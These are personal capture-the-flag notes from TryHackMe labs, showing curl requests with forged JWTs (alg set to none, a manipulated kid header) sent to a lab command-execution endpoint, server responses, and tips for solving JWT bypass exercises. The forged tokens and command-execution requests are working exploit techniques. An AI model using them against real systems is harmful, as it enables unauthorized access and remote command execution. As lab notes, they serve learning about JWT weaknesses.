
curl -X POST http://10.114.153.238:1337/execute_command.php -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwia2lkIjoiL3Zhci93d3cvbXlrZXkua2V5In0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcyNzM0ODE2LCJleHAiOjE3NzI3Mzg0MTYsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ." -d '{"command":"pwd"}'

---

working paylaod....

curl -X POST http://10.114.153.238:1337/execute_command.php \
-H "Content-Type: application/json" \
-H "X-Requested-With: XMLHttpRequest" \
-H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwia2lkIjoiL2Rldi9udWxsIn0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcyNzM0ODE2LCJleHAiOjE3NzI3Mzg0MTYsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ." \
-H "Cookie: persistentSession=4kk0l7uqtbelvagh7te03impm0" \
-d '{"command":"pwd"}'
{"error":"Command not allowed"}%        

marecini@parrot ~/Documents/thm/hammer
% curl -X POST http://10.114.153.238:1337/execute_command.php \
-H "Content-Type: application/json" \
-H "X-Requested-With: XMLHttpRequest" \
-H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwia2lkIjoiL2Rldi9udWxsIn0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcyNzM0ODE2LCJleHAiOjE3NzI3Mzg0MTYsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ." \
-H "Cookie: persistentSession=4kk0l7uqtbelvagh7te03impm0" \
-d '{"command":"pwd"}'
{"error":"Invalid token: Key material must not be empty"}%                                                                      marecini@parrot ~/Documents/thm/hammer


**ZSH may interpret special characters using curl requests**
In ZSH, when abusing JWT signin validation and submitting a URL via curl, remember to wrap the URL in quotes to avoid ZSH interpreting any special characters such as ?

**Problem**
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG  
1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' http://10.113.160.44/api/v1.0/example2?username=user

**Error**
No matches found 

**Fix : URL encode the URL**
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG  
1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' "http://10.113.160.44/api/v1.0/example2?username=user"

**Sidenote**
for some reason not having the URL in quotes for the authentication request seems to work fine. The URL seems to only need to be enclosed in quotes for the **verification request**

### TryHackMe JWT Security Room 

**JWT Security Example 2**
I spent 2.5 hours getting "invalid request" errors. I tried numerous ways to change the JWT payload to retrieve the flag without luck. 

I tried: 
1. Manually changing the *alg* field to "None" instead of "none" 
2. Executing the curl command without the dot (.) separators
3. Enabling URL-safe base64-encoding in CyberChef (which was needed but didnt work when I switched it on)
4. Executing the curl command without the signature

**Solution**
I checked the writeup and saw I had to change the value for the *username* parameter to **admin**. Simply updating  the admin field from 0 to 1 was not sufficient.

**JWT Security Example 3**
Verifying user with *alg* field set to *none* responded with:

{  
"message": "JWT could not be read: When alg = \"none\", key value must be None."  
}

**Updating the field to *None* gave me following response:** 
{  
"message": "Welcome user, you are not an admin"  
}

so... it works on this example to capitalize the first letter for some reason...